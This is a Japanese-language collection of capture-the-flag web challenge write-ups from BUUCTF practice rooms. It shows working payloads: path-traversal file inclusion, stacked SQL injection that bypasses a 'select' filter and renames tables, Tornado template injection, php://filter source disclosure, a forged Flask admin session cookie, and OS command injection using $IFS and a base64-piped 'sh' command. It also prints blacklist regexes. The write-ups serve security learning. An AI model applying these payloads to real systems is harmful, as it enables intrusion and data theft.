# [HCTF 2018]WarmUp
## /source.php
```php
<?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?>
```

## /hint.php
```
flag not here, and flag in ffffllllaaaagggg
```

> $_REQUEST 内の変数の内容は、 GET や POST そして COOKIE といった仕組みでスクリプトに渡されます。

GETでもPOSTでもいい

```
mb_substr — 文字列の一部を得る
mb_strpos — 文字列の中に指定した文字列が最初に現れる位置を見つける
```
```
$ curl http://9281cf7e-b005-450d-8919-19c2ba0b1f40.node3.buuoj.cn/ -d "file=hint.php?./hint.php"
```
うまくいかない。

```
$ curl http://9281cf7e-b005-450d-8919-19c2ba0b1f40.node3.buuoj.cn/ -d "file=hint.php?/../hint.php"
```

```
$ curl http://9281cf7e-b005-450d-8919-19c2ba0b1f40.node3.buuoj.cn/ -d "file=hint.php?/../../../../ffffllllaaaagggg"
```

flag{b82e2643-70f6-4048-90d2-26b2e0a89276}

# [强网杯 2019]随便注

```
return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);
```
selectが正規表現によって使えなくなっている。

```
1' or 1=1 #
```
でSQLiが通る。

```sql
1'; show databases;#
```
```sql
1'; show tables;#
```
```sql
1';show columns from words;#
```
```sql
1'; show columns from `1919810931114514`;#
```

##  selectをasciiコードに変換することでselectをbypassする

### 1つめの解

> PREPARE文を実行すると、指定された問い合わせの構文解析、書き換えが行われます。 その後、EXECUTE文が発行された際に、プリペアド文は実行計画が作成され、実行されます。

```sql
1'; PREPARE hacker from concat(char(115,101,108,101,99,116), '* from `1919810931114514`); EXECUTE hacker; #
```

```sql
1';PREPARE hacker from concat('s','elect', ' * from `1919810931114514` ');EXECUTE hacker;#
```

### 2つめの解
```sql
1';SET @sqli=concat(char(115,101,108,101,99,116),'* from `1919810931114514`');PREPARE hacker from @sqli;EXECUTE hacker;#
```
SET 文は新しい値を変数を代入する

### 3つめの解
```
1'; rename table words to word1; rename table  `1919810931114514` to words; alert table words 
add id int unsigned not Null auto_increment primary key ; alert table words change flag data 
varchar(100); #
```
https://www.techscore.com/tech/sql/SQL3/03_02.html/
```
テーブルの変更は ALTER TABLE 文で行います。既存のテーブルの定義を変更します。ALTER TABLE は次の機能を備えています。
* テーブルに列を追加する
* テーブルから列を削除する
* テーブルにテーブル制約を追加する
* テーブルからテーブル制約を削除する
* 列にデフォルト値を追加する
* 列からデフォルト値を削除する
```

これはよくわかってない。

## flag
```php
array(1) {
  [0]=>
  string(42) "flag{46d955e2-1b6b-4184-8efe-8aa648aaf6b1}"
}
```

# [SUCTF 2019]EasySQL

数字をいれると、Arrayが返ってくる。
1,2,3,4,5,みたいな感じしか1以外の入力を受け付けてない。
1,23,4,1みたいに最後の数字は1になる。
文字列もダメなど、WAFに弾かれていることがわかる。

## 1;show databases;#

```php
Array ( [0] => 1 ) Array ( [0] => ctf ) Array ( [0] => ctftraining ) Array ( [0] => information_schema ) Array ( [0] => mysql ) Array ( [0] => performance_schema ) Array ( [0] => test )
```

## 1;show tables;#

## 1;set sql_mode=PIPES_AS_CONCAT;SELECT 1
sql_modeを利用してCONCATとしてパイプを利用する。

また、
```sql
1,*
```
でもいいらしい。

## select 1||2 とは
```sql
select *,1||2
```
```sql
select 1 from Test;
```
の返り値は、カラムの数だけ1が返ってくる❓

```sql
select 1 || title from Test;
```
は1しか返ってこない。

```sql
select *,1 || title from Test;
```

idとtitleと1が返ってきてる。つまり、すべてが返ってくる。よくわかってない。

# [极客大挑战 2019]EasySQL

usernameに
```sql
‘ or 1=1#
```
いれるだけでflagでてきた。


# [极客大挑战 2019]Havefun

ソースコードみるだけ。

# [护网杯 2018]easy_tornado

filehash
c4b6eac7d43a398647521bea321ef5bd
→ md5❓

## /hints.txt
```php
md5(cookie_secret+md5(filename))
```
md5なら二重でもできるんじゃないかと一瞬おもったけど流石にムリで

## /error?msg={{2}}

msgにテンプレートインジェクションの脆弱性がある

```
トルネードのテンプレートでは、アクセス可能なクイックオブジェクトがいくつかあり、ここで使用されているものはhandler.settingsで、handlerはRequestHandlerを指し、RequestHandler.settingsはself.application.settingsを指しています。 handler.settings は、環境変数である RequestHandler.application.settings を指します。
```
https://sites.google.com/site/tornadowebja/documentation/overview

## /error?msg={{handler.settings}}
```
{'autoreload': True, 'compiled_template_cache': False, 'cookie_secret': 'c04a08db-f5fe-4bc4-ac4e-7ecc766d6c4f'}
```

## /file?filename=/fllllllllllllag&filehash=6d523f04b91fc691678043e7e9307b72

# [RoarCTF 2019]Easy Calc

正規表現のオプション修飾子
* 修飾子の種類と指定方法
* 大文字と小文字を区別せずにマッチを行う(/i修飾子)
* パターンの中の空白やコメントを無視する(/x修飾子)
* メタ文字(.)が改行にマッチする(/m修飾子)

```php
$blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
```

## /calc.php?num=phpinfo()
うまくいかない。
## /calc.php? num=phpinfo()
空白をいれるとwafをbypassできる。
これは、phpの構文解析の仕様で変数の前にスペースがあると構文解析の前にスペースを削除してくれることを利用している。
WAFが文字をnumにわたすことを許可していないが、変数numの前に空白をいれるとそれは変数numではないからbypassできる。多分。
あとは構文解析されれば、スペースは削除してくれるからnum変数に値をいれているのと同じになる???

## ? num=var_dump(scandir(chr(47)))
f1agg
## ? num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))

指定の文字が使えないときは、asciiの10進数表記に変換してphp上でバイト列を文字列に変換する。

# [极客大挑战 2019]Secret File】

action.phpに飛ばされてすぐend.phpにリダイレクトされる。
action.phpのレスポンスを見てみると

```
HTTP/1.1 302 Found
Server: openresty
Date: Wed, 12 Aug 2020 14:38:56 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 63
Connection: close
Location: end.php
X-Powered-By: PHP/7.3.11
```

```html
<!DOCTYPE html>

<html>
<!--
   secr3t.php        
-->
</html>
```

```php
    if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
```

stristr関数 文字列１から文字列２を検索する


## /secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php
```
PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7MTVlOTY0MTEtMjA1My00MTc3LWE0M2QtMjlkMDVlYmQ2OTE5fSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo=
```

# [极客大挑战 2019]LoveSQL
```
id: admin
pw: ‘1 or 1=1 #
```
で
```
Login Success!
Hello admin！

Your password is 'cf778af30fb59ea1654c83a49632a072'
```

## 1' union select 1,2,3#

```
Hello 2！
Your password is '3
```

## ' union select 1,group_concat(table_name),group_concat(column_name) from information_schema.columns#

```
users,users,users,geekuser,geekuser,geekuser,l0ve1ysq1,l0ve1ysq1,l0ve1ysq1
```

## ' union select 1,group_concat(username),group_concat(password) from l0ve1ysq1#
```
flag{fe4f2083-0fcc-43bc-8401-8b7ec595e2ab}
```


# [ACTF2020 新生赛]Include

## ?file=php://filter/convert.base64-encode/resource=flag.php

```bash
% echo -n 'PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7ZTc0N2UyOWYtNTgzOS00YzQ3LWJjYWMtNmRhYmRiYzViMzAzfQo=' | base64 -d
<?php
echo "Can you find out the flag?";
//flag{e747e29f-5839-4c47-bcac-6dabdbc5b303}
```

# [HCTF 2018]admin
```
Cookie: session=.eJw90LFugzAQBuBXqW5mwA4TUoZWpgikM0pkQOcFtYQIbJJKQBRwlHevm6Hb6Ybv_-8e0Jynbu4hXqZbF0AznCB-wNs3xEDqfSODTqqSSY4h1hnD-jhqk6zIP3uZZiGKvtcp3pHjKs3JapEw4tqSoVCbyqCinRcGNLTJVFtdl6tOy43UcZSqsoXPkDy3RZ1FRZ04MgeOBjm5j4Fc67NH-7cvhOxRlLxIyfvEveu0aDc_3X2_PTwDaOfp3Cw_trv-n4Ai77WyIfGMSeFrX3KjFXItKlOIMsKUdp6L0GTO84xUNcjD_sVdvy6dJ5ZuXiCA29xNr-cAC-H5C4lvY6o.XzSGbQ.E-3ACmftDiR0r90s0FFnqrKhQ1Q
```
JWTかと思ったが、デコードできない。

パスワードを変更するページのコメントにgithubのURLが書かれている。

## https://github.com/woadsl1234/hctf_flask/
## https://github.com/woadsl1234/hctf_flask/blob/master/user.sql

```
INSERT INTO `user` (`id`, `email`, `password_hash`, `username`) VALUES (1, NULL, 'pbkdf2:sha1:1000$HHGfbouP$eaa88f64aad0dd3f81a72c16337c03cd1bdc6be1', 'admin'), (2, NULL, 'pbkdf2:sha1:1000$ErwOESOB$f61a07b6836fab26e885f0dd5419b0f75ea5bf96', 'ckj123');
```
id:1がusername:adminであることがわかる。

### さっきみたsessionは、flaskのsession
フレームワークによって特有のエンコードがされてる??

```bash
$ python3 flask_session_cookie_manager3.py decode -c '.eJxF0LFugzAQBuBXqW5mADddkDKkglpUOqNEJtZ5iVriBGyaSkAEJsq718nS7XTD999_NzicejM0kI791URwaI-Q3uDlG1IgufFkcRGySgTDGFWRoNp12uYzso9G8CLGrGk0xwkZzsIenc7yhJh2ZCnWdm9R0msQWrTkBddOq2rWvPIkd52Qe1eGDME-XamKVanyheyWoUVGy3tLSx2yO_fYl5loMKtYySn4xIK76Kz2YZrCfWu4R1AP_ekw_jpz-a9gRYfLeUZOK8FEq1XhtT0HfvMW-AkVeS2LcCr5R7VQNxHb9ZO7fP2YQIxmGCGC62D653MgieH-BwaHZZc.XzSM-Q.tafq7Do_7uvnMmlRVYrzFqk5Wfg'
b'{"_fresh":true,"_id":{" b":"YTAyYjMzNTU1N2M0MWI1MWRlZjExM2FhNGI0MDhhZGMwM2MxNjdkZDE1Y2ZkYjY0ZjVjMTY3MzNiMjYyNGZkZWUxZGUyYTRlNTVkOTAyN2JkOWI4OWEzYjQ2MjM2YzBiYzczNTlkOWEzODNhMDU2OGY1Y2Y2MTYzZDcyY2MwNTU="},"csrf_token":{" b":"YjNlMzgxMGY4N2NiZWIyZjg2YzA5YzcwMWYyZTI0ZjYyMWRlYjM1NQ=="},"name":"test","user_id":"10"}'

'{"_fresh":true,"_id":{" b":"YTAyYjMzNTU1N2M0MWI1MWRlZjExM2FhNGI0MDhhZGMwM2MxNjdkZDE1Y2ZkYjY0ZjVjMTY3MzNiMjYyNGZkZWUxZGUyYTRlNTVkOTAyN2JkOWI4OWEzYjQ2MjM2YzBiYzczNTlkOWEzODNhMDU2OGY1Y2Y2MTYzZDcyY2MwNTU="},"csrf_token":{" b":"YjNlMzgxMGY4N2NiZWIyZjg2YzA5YzcwMWYyZTI0ZjYyMWRlYjM1NQ=="},"name”:”admin”,”user_id”:”1”}’
```

## https://github.com/woadsl1234/hctf_flask/blob/master/app/config.py
エンコードするときに署名しなければいけないのでkeyが必要になるがconfig.pyに書かれていた。

```bash
$ python3 flask_session_cookie_manager3.py encode -s 'ckj123' -t '{"name":"admin","user_id":"1"}'eyJuYW1lIjoiYWRtaW4iLCJ1c2VyX2lkIjoiMSJ9.XzSPIA.1qd67Fsbd9g2ErTAVcFUukw16sQ
```
```html
<h1 class="nav">flag{92615bb9-8e91-43cc-8f12-f8543bd02ded}</h1>
```

# [GXYCTF2019]Ping Ping Ping

?ip=192.168.2.100;id

```
/?ip=192.168.2.100:id
```
```
PING 192.168.2.100 (192.168.2.100): 56 data bytes
uid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data)
```

OSコマンドインジェクションできる

## ?ip=;ls
```
/?ip=
flag.php
index.php
```

## ?ip=;cat flag.php
```
?ip= fxck your space!
```
spaceをいれると怒られる。

## ?ip=;cat\tflag.php
```
?ip= fxck your flag!
```

## space bypass
```
%20、%09、$IFS$1、${IFS}、<>、{cat,flag}
```
などがある。

%09は、タブ文字
%20は、半角スペーズです。

> 環境変数「IFS」（Internal Filed Separator）には、bashの場合「スペース」「タブ」「改行」（$’ \t\n’）といった値が初期設定されていて、これらが文字の区切りとして認識されています。
> ファイル等を読み込んだりする場合に、読み込む文の区切り文字を変更したい場合は、「IFS」に区切り文字としたい値を設定することで、区切りとさせる文字を好きに設定することが出来ます。

macで確認してみると
```bash
% echo ${IFS}


takumaniwa@Takumas-MacBook-Pro react % ${IFS}     
zsh: command not found:  \t\n
```
\t\nが割り当てられていることがわかります。

$IFS$1でも同様の結果になります。
```bash
% echo $IFS$1


takumaniwa@Takumas-MacBook-Pro react % $IFS$1     
zsh: command not found:  \t\n
```

つまり、サーバ側で設定されているIFSを利用して空白として利用するということ。

## cat$IFS$1`ls`
```
/?ip=

/?ip=
|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
    die("fxck your symbol!");
  } else if(preg_match("/ /", $ip)){
    die("fxck your space!");
  } else if(preg_match("/bash/", $ip)){
    die("fxck your bash!");
  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");
  }
  $a = shell_exec("ping -c 4 ".$ip);
  echo "
";
  print_r($a);
}

?>
```

## ?ip=;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh
```php
/?ip=
<pre><?php
$flag = "flag{06c6b77d-475b-402a-aa5d-1df566f1cdf2}";
?>
```

他にもhexやoctに変換してflagが禁止されているのをbypassできる。